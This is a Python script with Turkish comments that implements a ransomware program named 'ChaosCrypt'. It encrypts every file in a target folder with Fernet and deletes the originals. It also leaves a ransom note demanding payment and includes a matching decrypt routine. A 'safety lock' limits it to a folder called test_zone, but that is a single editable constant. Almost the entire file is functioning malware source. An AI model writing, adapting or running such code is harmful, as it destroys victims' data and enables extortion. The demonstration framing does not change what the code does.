import os
from cryptography.fernet import Fernet

# Renkler
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

# GÜVENLİK KİLİDİ: Sadece bu klasörde çalışır!
TARGET_DIR = "test_zone"

def generate_key():
    """Şifreleme anahtarı üretir ve saldırgana (dosyaya) kaydeder."""
    key = Fernet.generate_key()
    with open("the_key.key", "wb") as the_key:
        the_key.write(key)
    return key

def load_key():
    """Anahtarı dosyadan yükler (Decryptor için)."""
    return open("the_key.key", "rb").read()

def encrypt_files():
    # Güvenlik Kontrolü
    if not os.path.exists(TARGET_DIR):
        print(f"{RED}[!] HATA: '{TARGET_DIR}' klasörü bulunamadı. Güvenlik nedeniyle durduruldu.{RESET}")
        return

    # Anahtarı üret
    key = generate_key()
    fernet = Fernet(key)
    
    print(f"{RED}[*] ChaosCrypt Başlatılıyor... Hedef: {TARGET_DIR}{RESET}")

    count = 0
    # Klasördeki dosyaları gez
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            # Kendini veya anahtarı şifreleme
            if file == "README_WARNING.txt" or file == "chaos.py" or file.endswith(".chaos"):
                continue
                
            file_path = os.path.join(root, file)
            
            try:
                # 1. Dosyayı Oku
                with open(file_path, "rb") as f:
                    data = f.read()
                
                # 2. Şifrele
                encrypted_data = fernet.encrypt(data)
                
                # 3. Yeni Dosyayı Yaz (.chaos uzantılı)
                with open(file_path + ".chaos", "wb") as f:
                    f.write(encrypted_data)
                
                # 4. Orijinal Dosyayı SİL
                os.remove(file_path)
                print(f" -> Şifrelendi: {file}")
                count += 1
            except Exception as e:
                print(f" [!] Hata: {file} - {e}")

    # Fidye Notunu Bırak
    ransom_note = f"""
    !!! DOSYALARINIZ ŞİFRELENDİ !!!
    
    Bütün dosyalarınız ChaosCrypt tarafından askeri düzeyde şifrelendi.
    Geri almak için 'the_key.key' dosyasını bize göndermeniz ve ödeme yapmanız lazım.
    
    Şifrelenen Dosya Sayısı: {count}
    """
    with open(os.path.join(TARGET_DIR, "README_WARNING.txt"), "w") as note:
        note.write(ransom_note)

    print(f"\n{RED}[!!!] OPERASYON TAMAMLANDI. DOSYALAR KİLİTLENDİ. [!!!]{RESET}")

def decrypt_files():
    # Güvenlik Kontrolü
    if not os.path.exists("the_key.key"):
        print(f"{RED}[!] Anahtar dosyası bulunamadı! Dosyalar sonsuza kadar kayıp...{RESET}")
        return

    key = load_key()
    fernet = Fernet(key)
    
    print(f"{GREEN}[*] Kurtarma Operasyonu Başlatılıyor...{RESET}")

    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith(".chaos"):
                file_path = os.path.join(root, file)
                
                try:
                    # 1. Şifreli Dosyayı Oku
                    with open(file_path, "rb") as f:
                        data = f.read()
                    
                    # 2. Deşifre Et
                    decrypted_data = fernet.decrypt(data)
                    
                    # 3. Orijinal İsmi Geri Getir (.chaos'u sil)
                    original_path = file_path[:-6] 
                    
                    with open(original_path, "wb") as f:
                        f.write(decrypted_data)
                    
                    # 4. Şifreli Dosyayı SİL
                    os.remove(file_path)
                    print(f" -> Kurtarıldı: {original_path}")
                except Exception as e:
                    print(f" [!] Hata: {file} - {e}")
    
    print(f"\n{GREEN}[+] SİSTEM NORMALE DÖNDÜ.{RESET}")

if __name__ == "__main__":
    print("1. ENCRYPT (Saldırı)")
    print("2. DECRYPT (Kurtarma)")
    choice = input("Seçim: ")
    
    if choice == "1":
        encrypt_files()
    elif choice == "2":
        decrypt_files()
